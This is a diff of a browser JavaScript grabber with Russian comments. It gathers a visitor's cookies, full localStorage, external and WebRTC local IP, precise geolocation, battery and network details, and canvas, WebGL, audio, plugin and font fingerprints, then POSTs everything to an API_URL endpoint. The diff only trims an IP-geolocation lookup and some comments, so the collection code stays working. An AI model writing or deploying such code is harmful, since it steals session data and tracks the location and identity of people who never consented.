@@ -17,8 +17,6 @@
             const data = {
                 timestamp: new Date().toISOString(),
                 ip: "",
-                geoIP: null,          // город по IP
-                geo: null,            // точные координаты (если разрешит)
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -37,6 +35,7 @@
                 online: navigator.onLine,
                 battery: "неизв",
                 network: "неизв",
+                geo: null,
                 localIP: null,
                 cookies: document.cookie || "нет",
                 localStorage: JSON.stringify(localStorage),
@@ -51,38 +50,22 @@
                 mimeTypes: null
             };
 
-            // 1. Внешний IP
+            // IP
             try {
                 const ipRes = await fetch("https://api.ipify.org?format=json");
-                const ip = (await ipRes.json()).ip;
-                data.ip = ip;
-
-                // 2. Гео по IP (город, провайдер)
-                try {
-                    const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=city,regionName,country,lat,lon,isp,org`);
-                    const geoData = await geoRes.json();
-                    if (geoData && geoData.city) {
-                        data.geoIP = geoData;
-                    }
-                } catch(e) {}
+                data.ip = (await ipRes.json()).ip;
             } catch(e) {}
 
-            // 3. Точная геолокация (если пользователь разрешит)
+            // Гео (точная)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.geo = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                    },
+                    pos => { data.geo = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }; },
                     () => {},
-                    { timeout: 5000, maximumAge: 0 }
+                    { timeout: 3000, maximumAge: 0 }
                 );
             }
 
-            // 4. Батарея
+            // Батарея
             if (navigator.getBattery) {
                 try {
                     const b = await navigator.getBattery();
@@ -90,13 +73,13 @@
                 } catch(e) {}
             }
 
-            // 5. Сеть
+            // Сеть
             if (navigator.connection) {
                 const c = navigator.connection;
                 data.network = `${c.effectiveType} (downlink: ${c.downlink} Mbps, rtt: ${c.rtt} ms, тип: ${c.type || "неизв"})`;
             }
 
-            // 6. Локальный IP (WebRTC)
+            // Локальный IP (WebRTC)
             try {
                 const rtc = new RTCPeerConnection({iceServers:[]});
                 rtc.createDataChannel('');
@@ -112,7 +95,7 @@
                 await rtc.setLocalDescription(offer);
             } catch(e) {}
 
-            // 7. Canvas fingerprint
+            // Canvas fingerprint
             try {
                 const canvas = document.createElement("canvas");
                 canvas.width = 200; canvas.height = 50;
@@ -126,7 +109,7 @@
                 data.canvas = canvas.toDataURL().substring(0, 150);
             } catch(e) {}
 
-            // 8. WebGL fingerprint
+            // WebGL fingerprint
             try {
                 const glCanvas = document.createElement("canvas");
                 const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
@@ -136,7 +119,7 @@
                 }
             } catch(e) {}
 
-            // 9. Аудиофингерпринт
+            // Аудиофингерпринт
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
@@ -158,21 +141,21 @@
                 data.audio = sum.toFixed(4);
             } catch(e) {}
 
-            // 10. Плагины
+            // Плагины
             if (navigator.plugins) {
                 const pl = [];
                 for (let i = 0; i < navigator.plugins.length; i++) pl.push(navigator.plugins[i].name);
                 data.plugins = pl.join(", ") || "нет";
             }
 
-            // 11. MIME-типы
+            // MIME-типы
             if (navigator.mimeTypes) {
                 const mimes = [];
                 for (let i = 0; i < navigator.mimeTypes.length; i++) mimes.push(navigator.mimeTypes[i].type);
                 data.mimeTypes = mimes.join(", ") || "нет";
             }
 
-            // 12. Шрифты
+            // Шрифты
             try {
                 const fontList = [
                     "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
@@ -191,7 +174,6 @@
                 data.fonts = JSON.stringify(result);
             } catch(e) {}
 
-            // Отправка всех данных
             await fetch(API_URL, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
